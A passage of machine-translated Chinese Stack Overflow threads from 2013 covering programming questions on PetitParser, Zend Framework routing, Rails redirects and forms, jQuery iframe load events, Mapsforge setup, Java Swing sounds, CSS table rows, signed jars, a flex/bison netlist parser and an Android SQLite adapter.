  decimalIntegerLiteral --> decimalNumeral , (integerTypeSuffix optional) 
```

如果我将它们更改为：

```
integerLiteral --> (hexIntegerLiteral / octalIntegerLiteral / decimalIntegerLiteral) , (integerTypeSuffix optional)
  hexIntegerLiteral     --> hexNumeral
  octalIntegerLiteral   --> octalNumeral
  decimalIntegerLiteral --> decimalNumeral 
```

then`0777L`不再被解析。它应该匹配`octalNumeral , (integerTypeSuffix optional)`或在新版本`octalIntegerLiteral , (integerTypeSuffix optional)`中，但没有发生。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T15:21:28.643

是的，PetitParser 中的有序选择是分布式的。在您的示例中，缺少一些上下文，所以我不知道为什么它对您不起作用。

PetitParser 优化器会自动执行您建议的更改。重写规则（以稍微更一般的形式）定义为：

```
PPOptimizer>>#postfixChoice
    <optimize>

    | before prefix body1 body2 postfix after |
    before := PPListPattern any.
    prefix := PPPattern any.
    body1 := PPListPattern any.
    body2 := PPListPattern any.
    postfix := PPPattern any.
    after := PPListPattern any.
    rewriter
        replace: before / (prefix , body1) / (prefix , body2) / after
        with: before / (prefix , (body1 / body2)) / after.
    rewriter
        replace: before / (body1 , postfix) / (body2 , postfix) / after
        with: before / ((body1 / body2) , postfix) / after 
```

# php - Zend Framework 2 中的 RESTful API 和版本控制

> ID：15526241
> 
> 赞同：0
> 
> 时间：2013-03-20T14:23:39.617
> 
> 标签：php, api, rest, doctrine, zend-framework2

我在 Zend Framework 2.1 中创建了一个 RESTful API，但我仍然不知道为这个 API 进行版本控制的最佳方法是什么。我还将该学说用作我的应用程序的模型部分。我想要这样的链接：

*   api.name-of-my-project.com/v1/products
*   api.name-of-my-project.com/v1/products/123

其中`v1`描述了 API 的版本。

到目前为止，我已经创建了没有版本控制的 API，我也有一些关于如何创建版本控制的想法，但首先我想知道你对这个问题的看法。我应该怎么做才能将不同版本的控制器和其他类分开，以及如何管理路由？顺便说一句，我认为我对创建另一个模块并不真正感兴趣，因为我已经有了类似`API`.

最终的应用程序应该能够使用“许多”版本的 API。我还想在我的新版本中继承旧版本 API 的一些功能。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T18:32:42.000

您可以在模块配置中使用 zf2 路由数组执行此操作 将 v1 的路由映射到 versiononecontroller，将 v2 映射到 versiontwocontroller

# ruby-on-rails - 如何将丢失的 *.htm 页面重定向到 Rails 中的已知页面？

> ID：15526242
> 
> 赞同：0
> 
> 时间：2013-03-20T14:23:40.600
> 
> 标签：ruby-on-rails, ruby-on-rails-3, routing

我们最近用闪亮的新 Ruby on Rails 站点替换了旧的 HTML 站点。不幸的是，许多搜索引擎仍在寻找不再存在的“index.htm”之类的页面。

我们已经有一个默认路由可以捕获错误的 URL 并给出 404，但是对于以 .htm 结尾的 URL，我更愿意使用 302 重定向到不同的页面。

这是我们目前使用的包罗万象：

```
match '*a', :to => 'errors#routing' 
```

我可以在上面添加什么来捕获'index.htm'和其他任何*.htm？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:27:34.797

假设您有与旧路线相同的 Rails 路线（`.html`最后没有），您应该能够`:format`在您的路线中添加一个可选路线。查看默认捕获所有路由定义：

```
match ':controller(/:action(/:id))(.:format)' 
```

关键`(.:format)`在最后。尝试将其添加到其他路由，它应该适用于旧版和非旧版 URL。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T09:50:05.513

采用`match '*a.htm' => redirect("/", :status => 302)`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T20:00:24.087

我尝试了第一个解决方案，但没有取得多大成功。不过，这很好用。

```
match '*a.htm', to: 'errors#redirect_to_home' 
```

错误控制器在哪里：

```
# -*- encoding : utf-8 -*-
class ErrorsController < ApplicationController
  def routing
    render_404
  end

  def redirect_to_home
    redirect_to root_url
  end
end 
```

# javascript - 无论我把它放在哪里，Onload 都会触发

> ID：15526245
> 
> 赞同：0
> 
> 时间：2013-03-20T14:23:50.200
> 
> 标签：javascript, jquery

是的，我对此感到非常激动。我可能做错了什么，但这就是我正在做的事情：

```
$(document).ready(function () {
    $('#somebutton').click(function () {
        openPage1();
    });
    $('#someotherbutton').click(function () {
        openPage2();
    });
});
var openPage1 = function () {
    $('#iframe').attr('src', 'someurl');
    $('#iframe').load(function () {
        $('#button').click();
    });
};
var openPage2 = function () {
    $('#iframe').attr('src', 'anotherurl');
    $('#iframe').load(function () {
        $('#anotherbutton').click();
    });
} 
```

每当我单击`somebutton`时，一切都会按预期进行。但是，当我单击`someotherbutton`. 首先调用`.load()`from `openPage1()`，我找不到阻止它的方法。`.load()`from`openPage1()`有一个同名的按钮，但是在`openPage2()`单击按钮之前我需要修改内容。

我需要使用`.load()`，因为在文档准备好之前我无法单击按钮。

基本上我需要的是两个单独`.load()`的实例`iframe`，它们不会相互触发。

除此之外，也许我对jQuery / JS的理解是错误的，但`.load()`事件不应该只在点击相应按钮后才监听吗？

谁能帮帮我，这让我整个下午都很忙。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-20T14:28:57.213

尝试使用 on，一旦加载，取消绑定

```
$("#iframe").on("load", function(){
    $(this).off("load");
    $('#button').click();
}); 
```

这样您就可以在单击第二个按钮之前删除您放置的处理程序？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T14:45:43.893

通过编写 : `$('#iframe').load(function (){ $('#button').click(); });`，您将在 load 事件上添加一个侦听器，该侦听器将保留并在 iframe 的每次后续重新加载时重新执行。

这是一个[jsfiddle](http://jsfiddle.net/5Dt8c/)来演示这一点：单击“重新加载”按钮，查看“已加载”消息出现在控制台中的次数。

在您的情况下，如果您单击`#somebutton`，然后`#someotherbutton`单击 ，在第二次单击后，您将在`load`事件上绑定两个处理程序，并且都将被触发。

如果你点击 5 次`#somebutton`，你最终应该会调用 5 次`$('#button').click()`。

如果你想执行*一次*，你可以按照[Fred 的建议](https://stackoverflow.com/a/15526363/86072)，或者使用 jQuery [`.one()`](http://api.jquery.com/one/)binder：

```
$('#iframe').one('load', function(){  $('#button').click()  }); 
```

这是更新后的[jsfiddle](http://jsfiddle.net/5Dt8c/1/)：“加载”每次点击应该只显示一次。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-20T14:27:24.897

也许尝试替换两个函数中的行，如下所示：

```
$('#iframe').load(function() {
    $('#anotherbutton').click();
};
$('#iframe').attr('src', 'anotherurl'); 
```

否则，它可能会在设置新的事件处理程序之前触发事件。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T14:39:48.357

~~这并不是您问题的真正答案~~现在它是一个答案，但我认为在这里使用预期的功能可能是有益的，即：

```
//Utilize a single function that takes arguments
var openPage = function (frame, src, eventEl) {
    frame.attr('src', src);      // If you pass frame as a jQuery object, you don't
    frame.on("load", function(){ // need to do it again
        $(this).off("load");
        evEl.click(); //Same for your buttons
    });
}

//Simplify other code
$(document).ready(function () {
    $('#somebutton').click(function () {
        openPage($("#iframe"),somehref,$("#buttonelement"));
    });
    $('#someotherbutton').click(function () {
        openPage($("#iframe"),anotherhref,$("#someotherbuttonelement"));
    });
}); 
```

# android - 如何将 Mapsforge 库源导入 Eclipse

> ID：15526246
> 
> 赞同：2
> 
> 时间：2013-03-20T14:23:50.533
> 
> 标签：android, eclipse, import, android-library

我对使用库有点陌生，想在这里寻求一些基本的帮助。

我一直在尝试在这里使用 Mapsforge 的 .jar 库：[https](https://code.google.com/p/mapsforge/downloads/list) ://code.google.com/p/mapsforge/downloads/list ，但是 .jar 文件似乎已经过时了，而且它们似乎只更新了他们在一些 git 存储库中的源代码上的东西。

我被引导到这里：[https://code.google.com/p/mapsforge/source/checkout](https://code.google.com/p/mapsforge/source/checkout)，我似乎能够获得最新的代码。但是我不知道如何将其作为库导入到我的 Eclipse 中以供我自己使用。它似乎不像在 lib 文件夹中复制/粘贴一个 .jar 文件那么简单。

谁能给我一个粗略的指导，让我一步一步地做到这一点，以便我能够使用更新的代码？我对这个 git 存储库并不是很熟悉。

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-05-03T14:04:59.933

你在用linux吗？然后：

第1步：安装git & maven（即在shell中“su -c 'pacman -S maven git'”）

步骤 2.1：创建存储 git 存储库的文件夹（即在 shell “mkdir ~/Documents/git”中）

步骤 2.2：使用 shell 转到任意文件夹（即在 shell "cd ~/Documents/git" 中）

第 3 步：检查存储库（在 shell 中“git clone [https://code.google.com/p/mapsforge/source/checkout](https://code.google.com/p/mapsforge/source/checkout) ”）

第 4 步：进入 mapsforge 目录（即 cd ~/Documents/git/mapsforge）

第 5 步：在 shell 中输入“mvn clean && mvn install”

第 6 步：jar 现在应该在 path_to_mapsforge//mapsforge-map/target/ 中（即 ~/Documents/git/mapsforge/mapsforge-map/target/ ）

第 7 步：在需要该库的应用程序中创建文件夹库（即 ~/Documents/workspace/AdvancedMapViewer/libs ）

第 8 步：将 mapsforge-map-0.3.1-SNAPSHOT-jar-with-dependencies.jar 复制到上述目录

步骤 9：在 Eclipse 中单击项目右键并选择刷新

第10步：在eclipse中右键项目->选择构建路径->配置构建路径

第 12 步：在库中删除包含 jar 名称的条目

第 11 步：在库中选择添加 jar 并选择提到的 jar

现在它应该工作......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-03T15:17:20.803

只需在单独的 java 项目中构建 mapsforge 源代码，即可获取 jar 并将其导入您的 Android 项目。

在您构建 jar 的项目中，请注意遵循 JDK 1.6 编码规则。设置 Java 编译器 -> JDK 合规性 -> 1.6（如果您使用较旧的 Android SDK 2.x、API 10 及更低版本，则为 1.5）

要将 jar 导入您的 Android 项目： [https ://stackoverflow.com/a/6859020/891479](https://stackoverflow.com/a/6859020/891479)

如果需要，不要忘记导入依赖库。对于日志记录，您可能还需要导入 slf4j-android-1.xxjar。

# fusioncharts - 带有自定义上下文菜单的融合图表

> ID：15526251
> 
> 赞同：0
> 
> 时间：2013-03-20T14:24:06.223
> 
> 标签：fusioncharts, custom-contextmenu

我正在使用 Fusion 图表，并希望在右键单击时添加一些自定义菜单（除了显示的菜单）。在融合图表博客中，他们说我们无法添加自己的自定义菜单，但我们只能更改**关于**菜单。是否有任何解决方法，以便我可以添加至少一个我自己的菜单，单击它将调用 javascript 函数

我正在使用 flash 来渲染融合图。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T15:07:32.790

您无法添加新菜单项 - 但您可以替换现有菜单项的文本和单击操作，如[http://docs.fusioncharts.com/charts/contents/AttDesc/CustomAboutMenu.html中所述](http://docs.fusioncharts.com/charts/contents/AttDesc/CustomAboutMenu.html)

# ruby-on-rails-3 - 从另一个控制器的操作调用的 Rails 表单

> ID：15526253
> 
> 赞同：0
> 
> 时间：2013-03-20T14:24:13.193
> 
> 标签：ruby-on-rails-3, routing

我有模型`User`，，，`Event`。`Rsvp`我想让一个`Rsvp`表格出现在`show`我的`Event`模型页面中。一个用户可以创建许多事件，但我不需要知道哪个用户创建了哪个事件（至少我不认为）。用户也可以回复事件。我的模型看起来像这样：

**用户.rb**

```
has_many :rsvps 
```

**事件.rb**

```
has_many :rsvps 
```

**rsvp.rb**

```
belongs_to :user
belongs_to :event 
```

我认为我的 RsvpsController 应该是这样的：

```
class RsvpsController < ApplicationController
  def new
    @user = current_user
    @event = Event.find(params[:id])
    @rsvp = Rsvp.new
  end
end 
```

现在在我的`show`页面中，`Event`我想在侧边栏中有一个表单，让`Users`rsvp 到`Event`. 我有这样的东西，但它不太正确。我特别不确定 form_for 的第一个参数是什么：

```
form_for [@user, @event, @rsvp], url: {controller: 'rsvps_controller', action: 'create' } do |f| 
```

在我的 events/show.html.haml 中，我尝试像这样呈现 Rsvp 新动作：

```
=render template: 'rsvps/new' 
```

但这反而呈现了一个事件/新的部分

**编辑** 我想我知道为什么这个渲染会渲染一个 Event new 部分。在 Rsvps/new.html.haml 我有`render 'form'`. 我的 Events 文件夹中也有一个 _form.html.haml。

**编辑2**

**rsvps_controller.rb**

```
def create
  @rsvp = current_user.rsvps.build(params[:rsvp])
  if @rsvp.save
    flash[:success] = "You have RSVPed."
    redirect_to Event.find(params[:event_id])
  else

  end
end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:38:15.423

由于您想为当前用户创建预订，您应该只将事件传递给 rsvp create 操作。对于表格，使用

```
<%= form_for Rsvp.new do |f| %>
  <%= f.hidden_field :event_id, value: @event.id %> 
```

这应该使您可以访问当前用户想要回复的事件。因此，在 Rsvp 控制器的创建操作中，您可以使用以下代码构建预订

```
def create
  @rsvp = current_user.rsvps.build params[:rsvp]

  if @rsvp.save
    ...
end 
```

# java - 为 Java 计算器获取按钮按下声音的最佳方法？

> ID：15526255
> 
> 赞同：5
> 
> 时间：2013-03-20T14:24:21.197
> 
> 标签：java, swing, audio, jbutton, javasound

我是一名学习 Java 的学生，正在为我的简历做一个独立的项目。我决定做一个 Java 计算器，因为我知道构成它的大部分组件。我不知道该怎么做的一件事是在按钮按下时添加声音。我对 Audiostream 输入的东西有一个模糊的想法。但是我的计算器上的每个按钮都需要独特的声音。现在我的计算器还没有完全完成（听众还没有工作。）我只是想知道将我的 .wav 文件合并到按钮按下的最佳方法是什么。提前致谢。

```
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;

public class Calculator {

    //instance variables
    JFrame frame;
    JPanel mainPanel, northPanel, southPanel;
    JTextField numberLabel;
    JButton backspace, multiply, divide, add, subtract, equal; //four function buttons
    JButton one, two, three, four, five, six, seven, eight, nine, zero; //number buttons
    JButton posOrNeg, decimal, leftParenthese, rightParenthese;

    //constructor
    public Calculator()
    {
        //create it
        frame = new JFrame();
        mainPanel = new JPanel(); //contains both panels
        mainPanel.setForeground(Color.BLACK);
        mainPanel.setBackground(Color.DARK_GRAY);
        northPanel = new JPanel(new BorderLayout()); //contains the number label in border layout
        southPanel = new JPanel(new GridLayout(5, 4)); //contains the buttons in border layout
        numberLabel = new JTextField(37); //*************************
        backspace = new JButton();
        backspace.setForeground(Color.WHITE);
        backspace.setBackground(Color.GRAY);
        multiply = new JButton();
        multiply.setForeground(Color.WHITE);
        multiply.setBackground(Color.MAGENTA);
        divide = new JButton();
        divide.setForeground(Color.WHITE);
        divide.setBackground(Color.PINK);
        add = new JButton();
        add.setForeground(Color.WHITE);
        add.setBackground(Color.BLUE);
        subtract = new JButton();
        subtract.setForeground(Color.WHITE);
        subtract.setBackground(Color.RED);
        equal = new JButton();
        equal.setForeground(Color.WHITE);
        equal.setBackground(Color.ORANGE);
        zero = new JButton();
        zero.setForeground(Color.DARK_GRAY);
        zero.setBackground(Color.GREEN);
        one = new JButton();
        one.setForeground(Color.DARK_GRAY);
        one.setBackground(Color.GREEN);
        two = new JButton();
        two.setForeground(Color.DARK_GRAY);
        two.setBackground(Color.GREEN);
        three = new JButton();
        three.setForeground(Color.DARK_GRAY);
        three.setBackground(Color.GREEN);
        four = new JButton();
        four.setForeground(Color.DARK_GRAY);
        four.setBackground(Color.GREEN);
        five = new JButton();
        five.setForeground(Color.DARK_GRAY);
        five.setBackground(Color.GREEN);
        six = new JButton();
        six.setForeground(Color.DARK_GRAY);
        six.setBackground(Color.GREEN);
        seven = new JButton();
        seven.setForeground(Color.DARK_GRAY);
        seven.setBackground(Color.GREEN);
        eight = new JButton();
        eight.setForeground(Color.DARK_GRAY);
        eight.setBackground(Color.GREEN);
        nine = new JButton();
        nine.setForeground(Color.DARK_GRAY);
        nine.setBackground(Color.GREEN);
        posOrNeg = new JButton();
        posOrNeg.setForeground(Color.WHITE);
        posOrNeg.setBackground(Color.LIGHT_GRAY);
        decimal = new JButton();
        decimal.setForeground(Color.WHITE);
        decimal.setBackground(Color.CYAN);
        leftParenthese = new JButton();

        rightParenthese = new JButton();

        //configure it
        frame.setTitle("My Calculator");
        frame.setSize(450, 225);
        frame.setLocation(200, 200);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setVisible(true);

        //buttons
        backspace.setText("Back Space");
        leftParenthese.setText("(");
        rightParenthese.setText(")");
        multiply.setText("x");
        divide.setText("/");
        add.setText("+");
        subtract.setText("-");
        equal.setText("=");
        zero.setText("0");
        one.setText("1");
        two.setText("2");
        three.setText("3");
        four.setText("4");
        five.setText("5");
        six.setText("6");
        seven.setText("7");
        eight.setText("8");
        nine.setText("9");
        posOrNeg.setText("+/-");
        decimal.setText(".");

        //add it
        northPanel.add(numberLabel, BorderLayout.NORTH);
        southPanel.add(backspace);
        southPanel.add(leftParenthese);
        southPanel.add(rightParenthese);
        southPanel.add(multiply);
        southPanel.add(seven);
        southPanel.add(eight);
        southPanel.add(nine);
        southPanel.add(divide);
        southPanel.add(four);
        southPanel.add(five);
        southPanel.add(six);
        southPanel.add(add);
        southPanel.add(one);
        southPanel.add(two);
        southPanel.add(three);
        southPanel.add(subtract);
        southPanel.add(zero);
        southPanel.add(decimal);
        southPanel.add(posOrNeg);
        southPanel.add(equal);
        mainPanel.add(northPanel, BorderLayout.NORTH);
        mainPanel.add(southPanel, BorderLayout.SOUTH);
        frame.add(mainPanel);

        //add listener
        one.addActionListener(new ButtonListener());
        two.addActionListener(new ButtonListener());
        three.addActionListener(new ButtonListener());
        four.addActionListener(new ButtonListener());
        five.addActionListener(new ButtonListener());
        six.addActionListener(new ButtonListener());
        seven.addActionListener(new ButtonListener());
        eight.addActionListener(new ButtonListener());
        nine.addActionListener(new ButtonListener());
        zero.addActionListener(new ButtonListener());
        multiply.addActionListener(new ButtonListener());
        divide.addActionListener(new ButtonListener());
        add.addActionListener(new ButtonListener());
        subtract.addActionListener(new ButtonListener());
        equal.addActionListener(new ButtonListener());
        posOrNeg.addActionListener(new ButtonListener());
        decimal.addActionListener(new ButtonListener());
        backspace.addActionListener(new ButtonListener());
        leftParenthese.addActionListener(new ButtonListener());
        rightParenthese.addActionListener(new ButtonListener());

    }

    //define action listener
    class ButtonListener implements ActionListener
    {
        public void actionPerformed(ActionEvent e)
        {
            if(e.getSource() == one)
            {

            }
            if(e.getSource() == two)
            {

            }
            if(e.getSource() == three)
            {

            }
            if(e.getSource() == four)
            {

            }
            if(e.getSource() == five)
            {

            }
            if(e.getSource() == six)
            {

            }
            if(e.getSource() == seven)
            {

            }
            if(e.getSource() == eight)
            {

            }
            if(e.getSource() == nine)
            {

            }
            if(e.getSource() == zero)
            {

            }
            if(e.getSource() == multiply)
            {

            }
            if(e.getSource() == divide)
            {

            }
            if(e.getSource() == add)
            {

            }
            if(e.getSource() == subtract)
            {

            }
            if(e.getSource() == equal)
            {

            }
            if(e.getSource() == posOrNeg)
            {

            }
            if(e.getSource() == decimal)
            {

            }
            if(e.getSource() == backspace)
            {

            }
            if(e.getSource() == leftParenthese)
            {

            }
            if(e.getSource() == rightParenthese)
            {

            }
        }
    }    
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-20T14:28:54.280

```
String soundName = "yourSound.wav";    
AudioInputStream audioInputStream = AudioSystem.getAudioInputStream(new File(soundName).getAbsoluteFile());
Clip clip = AudioSystem.getClip();
clip.open(audioInputStream);
clip.start(); 
```

这应该可以帮助您实现您想要的。

是的，您将需要这些进口：-

```
import java.io.File;
import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.Clip; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-20T14:33:21.220

```
 public static synchronized void playSound(final String url) {
    new Thread(new Runnable() { // the wrapper thread is unnecessary, unless it blocks on the Clip finishing, see comments
      public void run() {
        try {
          Clip clip = AudioSystem.getClip();
          AudioInputStream inputStream = AudioSystem.getAudioInputStream(Main.class.getResourceAsStream("/path/to/sounds/" + url));
          clip.open(inputStream);
          clip.start(); 
        } catch (Exception e) {
          System.err.println(e.getMessage());
        }
      }
    }).start();
  } 
```

检查链接[http://www.developer.com/java/other/article.php/2173111/Java-Sound-Playing-Back-Audio-Files-using-Java.htm](http://www.developer.com/java/other/article.php/2173111/Java-Sound-Playing-Back-Audio-Files-using-Java.htm)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-11-24T04:38:27.593

我也是一个学习的学生，刚刚找到了这个解决方案！它对我有用，而且非常简单！

```
URL soundbyte = new File("yourpath/sound.wav").toURI().toURL();
java.applet.AudioClip clip = java.applet.Applet.newAudioClip(soundbyte);
clip.play(); 
```

它知道它适用于 .wav 文件，也可能适用于 .au 文件……似乎不适用于 mp3。

# css - 如何使用 *CSS2* 而不是 CSS3 选择 HTML 表格中的每一行？

> ID：15526257
> 
> 赞同：1
> 
> 时间：2013-03-20T14:24:22.507
> 
> 标签：css, html

如何使用 CSS2 选择 HTML 表格中的每一行？如果这是不可能的，也欢迎 CSS3 的答案。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-20T14:25:06.863

遗憾的是，没有纯粹使用 CSS2 的解决方案。

但是，您可以使用CSS3 中的`:odd`和`:even`选择器来确定每一行。

```
tr:nth-child(even) {
   // if it's even - rows 2,4,6 etc - apply styles
}

tr:nth-child(odd) {
   // if it's odd - rows 1,3,5 etc - apply styles
} 
```

`nth-child even/odd`所有主流浏览器都支持，但在 IE8 及之前版本中不支持。

如果您想要一种使其适用于 IE8 及更早版本的方法，请查看[这篇](http://verboselogging.com/2010/01/17/making-nth-child-work-everywhere)关于使 nth-child 无处不在的文章。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-20T14:25:06.363

```
tr:nth-child(even) {
   /* stub */
} 
```

或者

```
tr:nth-child(odd) {
   /* stub */
} 
```

[浏览器支持请看这里](http://caniuse.com/#feat=css-sel3)

# java - 如何替换签名jar中的单个类文件？

> ID：15526258
> 
> 赞同：1
> 
> 时间：2013-03-20T14:24:28.217
> 
> 标签：java, jar, signed

我是 Java 新手。我有一个基本问题。我开发了一个 Core Java 应用程序并将其部署为一个签名的 jar（例如 App.jar）。如果我需要更正 jar 中的单个类文件（假设在应用程序中发现了一些主要错误），那么正确的方法是什么？

我不想再次发布新的 App.jar。是否可以替换签名 jar 中的单个类文件？请指导我提出您的宝贵建议。

谢谢JK

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-22T08:38:20.740

您必须构建并签署一个完整的新 jar。签名的全部目的是避免你想要达到的目标。

# syntax-error - 为什么我的野牛规则不起作用

> ID：15526259
> 
> 赞同：1
> 
> 时间：2013-03-20T14:24:34.393
> 
> 标签：syntax-error, bison, flex-lexer

每次运行解析器都会出现“第1行<>附近的语法错误”（因为有一个子程序yyerror(char *s)）。我认为那是因为我的野牛规则有问题。

我要解析的文件 (c17.isc)。

```
*c17 iscas example (to test conversion program only)
*---------------------------------------------------
*
*
*  total number of lines in the netlist ..............    17
*  simplistically reduced equivalent fault set size =     22
*        lines from primary input  gates .......     5
*        lines from primary output gates .......     2
*        lines from interior gate outputs ......     4
*        lines from **     3 ** fanout stems ...     6
*
*        avg_fanin  =  2.00,     max_fanin  =  2
*        avg_fanout =  2.00,     max_fanout =  2
*
*
*
*
*
    1     1gat inpt    1   0      >sa1
    2     2gat inpt    1   0      >sa1
    3     3gat inpt    2   0 >sa0 >sa1
    8     8fan from     3gat      >sa1
    9     9fan from     3gat      >sa1
    6     6gat inpt    1   0      >sa1
    7     7gat inpt    1   0      >sa1
   10    10gat nand    1   2      >sa1
     1     8
   11    11gat nand    2   2 >sa0 >sa1
     9     6
   14    14fan from    11gat      >sa1
   15    15fan from    11gat      >sa1
   16    16gat nand    2   2 >sa0 >sa1
     2    14
   20    20fan from    16gat      >sa1
   21    21fan from    16gat      >sa1
   19    19gat nand    1   2      >sa1
    15     7
   22    22gat nand    0   2 >sa0 >sa1
    10    20
   23    23gat nand    0   2 >sa0 >sa1
    21    19 
```

我的flex文件如下，是对的。您可以在此处找到有关我的扫描仪如何工作的一些信息。 [我的 flex 文件的输出错误](https://stackoverflow.com/questions/15510101/error-in-the-output-of-my-flex-file)

声明.h

```
# include <stdio.h>
# include <string.h>
# include <stdlib.h>

# define INPT 1
# define NOR 2
# define NAND 3
# define NOT 4
# define XOR 5
# define AND 6
# define BUFF 7
# define FROM 8 
```

弹性文件是

```
%{
# include "declare.h"
# include "parse.tab.h"

/*gi=1,it's input;gi=8,it's fanout;otherwise,it's gate*/
static int gi=-1;
static int inum=0;

struct{
    char *symbol;
    int val;
} symtab[]={
{"inpt", INPT},
{"nor", NOR},
{"nand", NAND},
{"not", NOT},
{"xor", XOR},
{"and", AND},
{"buff", BUFF},
{"from",FROM},
{"0",0}
};

extern FILE *yyin;

extern int yylval;
%}

%start A B C D E

DIGITS [0-9]+
BLANK [ \t\n\r\f\v\b]+
ALPHA [a-z]+

%%

"*".*\n     {BEGIN A; return(COMMENT);}

<A>{DIGITS}        {yylval=atoi(yytext); BEGIN B; return(NUM);}
<B>{DIGITS}{ALPHA} {yylval=atoi(yytext); BEGIN C; return(GNAME);}
<C>{DIGITS}        {yylval=atoi(yytext); BEGIN D; return(OPNUM);}
<C>{DIGITS}{ALPHA} {yylval=atoi(yytext); BEGIN A; return(FR);}
<D>{DIGITS}        {inum=atoi(yytext);
                    yylval=inum;
                    if(gi==1)
                    {BEGIN A;}
                    if(gi!=1)
                    {BEGIN E;}
                    return(IPNUM);
                   }

<E>{DIGITS}        {inum--;
                    yylval=atoi(yytext);
                    if(inum<0)
                    {BEGIN B; return(NUM);}
                    else
                    {BEGIN E; return(ILIST);} 
                   }

{ALPHA} {yylval=lookup(yytext);
         return(GTYPE);      
         }

">sa"[0-1] {yylval=atoi(&yytext[yyleng-1]);return(FAULT);}

{BLANK}    ;

.          ;

%%
int lookup(const char *s)
{
    int i;
    for (i = 0; symtab[i].val != 0; i++)
    {
        if (strcmp(symtab[i].symbol, s) == 0)
            break;
    }
    return(symtab[i].val);
} 
```

bison文件中正确的规则如下

```
parto: 
     | parto COMMENT
     | parto parti
     ;

parti: NUM
       {...}

       GNAME
       {...}

       GTYPE
       {...}

      | parti partii 
      | parti partiii
      ;

partii:OPNUM
       {...}

       IPNUM
       {...}

       partiv

       partv
       ;

partiii: FR
        {...}

         partiv
         ;

partiv: 
      | partiv FAULT
      {...}

      ;

partv:
     | partv ILIST
     {...}

     ; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T00:03:59.713

将关键评论转化为答案。

代码的第一版有几个问题。在扫描仪代码中，有这样的行：

```
<A>{DIGITS}        { yylval=atoi(yytext); return(NUM); BEGIN B; } 
```

> 您应该从`BEGIN`返回后出现的操作中收到有关无法访问代码的警告。`BEGIN`必须执行操作。它们没有被执行，所以你没有切换到你的开始状态。

迈克尔评论说：

> 没有警告。我已经按照您的说法对其进行了修改，并在问题中编辑了我的代码。现在我把 return 放在 BEGIN 之后。不过，“<�> 附近的第 1 行有语法错误”。

这可能意味着您没有编译带有足够警告的 C 代码。假设您使用的是 GCC，请添加`-Wall`到初学者的编译选项。警告也有可能需要优化。

> 您是否在返回令牌时打印了它们（在 Flex 扫描仪中）？你用 编译过 Bison 语法`-DYYDEBUG`吗？您还需要`yydebug = 1;`在`main()`程序中打开调试：当您期望它们时，您可能没有得到您期望的令牌。我还没有尝试编译这段代码。跟踪标记是（根据我的经验）让语法发挥作用的关键。否则，你就瞎跑了。
> 
> 另一个问题（密切相关）是您需要`FAULT`从语法（`bison -d grammar.y`generate `grammar.tab.h`）生成 etc 的符号名称。例如，您会发现它`COMMENT`被赋值为 258。但是，您的扫描仪会完全返回其他数字，因为它们位于`declare.h`. 你必须修复这种不匹配。一种选择是`#include "grammar.tab.h"`在您的扫描仪中；这或多或少是正常的。

回想起来，我认为这可能是最重要的观察；解决此问题后，事情似乎恢复到正常的 C 调试。

> （人们通常会包含 'grammar.h' 并且仅在 'grammar.tab.h' 的内容发生变化时才更新 'grammar.h'，因此您不必一直重新编译扫描仪）。

这样做的意义在于，语法使用的标记集趋于相当稳定，而与规则相关的动作随着语法实现的发展而一直在变化。因此，如果需要足够的时间值得担心，您可以创建`grammar.h`作为 副本的文件`grammar.tab.h`，但仅`grammar.h`在内容`grammar.tab.h`更改时更新。

```
cmp -s grammar.tab.h grammar.h || cp grammar.tab.h grammar.h 
```

您可以将此包含在将语法转换为 C 文件（或目标文件）的 makefile 规则中。

如果扫描仪足够小并且您的机器足够快，那么不用担心这种改进可能会更简单；在拥有几 MiB RAM 的 50 MHz 机器的日子里，它比现在运行在 2+ GHz 和几 GiB RAM 的多核机器更重要。

# android - 无法从 Android 中的 Sqlite 数据库中获取数据

> ID：15526260
> 
> 赞同：0
> 
> 时间：2013-03-20T14:24:36.087
> 
> 标签：android, sqlite

我从数据库中获取数据时遇到问题。在 LogCat 中，抱怨没有这样的列时间实例。这是我添加到数据库中的新列。只有获取有问题，但 createNewList 没有该列的问题。可能是什么问题呢？我发布了我的整个数据库课程。

```
public class TrackerDBAdapter {

 public static final String KEY_ROWID   = "_id";
 public static final String KEY_IDNUM   = "_idnum";
 public static final String KEY_SIMCARD = "_simcard";
 public static final String KEY_DESCRIPTION = "_description";
 public static final String KEY_MODEL = "_model";
 public static final String KEY_TIMEINSTANCE = "timeinstance";
 private static final String TAG = "TrackerDBAdapter";
 private static final String DATABASE_NAME = "DBTrackerList";
 private static final String SQLITE_TABLE = "TBTrackerList";
 private static final int DATABASE_VERSION = 1;
 private final Context mCtx;
 private static final String DATABASE_CREATE =
          "CREATE TABLE if not exists " + SQLITE_TABLE + " (" +
          KEY_ROWID + " integer PRIMARY KEY autoincrement," +
          KEY_IDNUM + "," +
          KEY_SIMCARD + "," +
          KEY_DESCRIPTION + "," +
          KEY_MODEL + "," +
          KEY_TIMEINSTANCE + "," +
          " UNIQUE (" + KEY_IDNUM +"));";

 private DatabaseHelper mDbHelper;
 private SQLiteDatabase mDb;

 private static class DatabaseHelper extends SQLiteOpenHelper {

